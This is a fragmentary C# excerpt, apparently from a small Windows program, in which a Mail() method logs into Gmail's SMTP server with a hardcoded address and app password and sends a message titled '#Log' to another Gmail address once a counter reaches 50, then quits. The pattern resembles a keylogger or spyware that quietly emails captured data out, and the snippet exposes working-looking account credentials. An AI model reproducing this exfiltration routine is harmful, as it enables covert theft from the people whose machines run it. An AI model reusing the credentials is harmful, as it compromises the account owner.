...
namespace sonodev
{
...

    {
        ...
        void Mail()
        {
            ...
            istemci.Credentials = new System.Net.NetworkCredential("mervzcnn3917@gmail.com", "hric agjo ofuv lznu");
            istemci.Port = 587;
            ...
            msj.Subject = " #Log";
            msj.From = new MailAddress("mervzcnn3917@gmail.com");
            msj.To.Add("mrvzcn10@gmail.com");
        ...
        {
            if (number >= 50 && !mailGonderildi)
            {
                mailGonderildi = true; // tekrar çağrılmayı engeller
                Mail();
                Application.Exit();
                return;
            }
